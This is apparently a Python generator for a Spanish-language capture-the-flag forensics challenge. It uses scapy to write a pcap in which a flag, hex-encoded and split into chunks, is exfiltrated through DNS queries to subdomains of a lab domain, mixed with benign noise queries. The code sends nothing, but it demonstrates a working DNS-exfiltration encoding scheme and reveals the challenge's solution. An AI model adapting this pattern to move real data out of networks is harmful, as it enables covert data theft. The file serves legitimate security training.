#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Genera dns.pcap: exfiltracion por DNS. Cada consulta pide un subdominio cuyo
label es un trozo hex de la flag. Concatenar los labels (en orden) y des-hex."""
import os
from scapy.all import IP, UDP, DNS, DNSQR, wrpcap
HERE = os.path.dirname(os.path.abspath(__file__))
flag = open(os.path.join(HERE, "..", "flag.txt")).read().strip()

cli, resolver = "192.168.50.77", "8.8.8.8"
DOMAIN = "exfil.cybervaras-lab.xyz"
hexflag = flag.encode().hex()
CHUNK = 12
chunks = [hexflag[i:i+CHUNK] for i in range(0, len(hexflag), CHUNK)]

pkts = []
# algo de ruido DNS legitimo
for name in ["www.duoc.cl", "portal.cybervaras.xyz", "update.ubuntu.com"]:
    pkts.append(IP(src=cli,dst=resolver)/UDP(sport=35000,dport=53)/DNS(rd=1,qd=DNSQR(qname=name)))

# las consultas de exfiltracion, con indice para preservar orden
for idx, ch in enumerate(chunks):
    qname = f"{idx:02d}-{ch}.{DOMAIN}"
    pkts.append(IP(src=cli,dst=resolver)/UDP(sport=35001+idx,dport=53)/DNS(rd=1,qd=DNSQR(qname=qname)))

wrpcap(os.path.join(HERE, "dns.pcap"), pkts)
# verificacion
rec = "".join(c.split("-",1)[1].split(".")[0] for c in
       [f"{i:02d}-{c}.{DOMAIN}" for i,c in enumerate(chunks)])
assert bytes.fromhex(rec).decode() == flag
print(f"[ok] dns.pcap generado ({len(chunks)} consultas de exfil) y verificado")
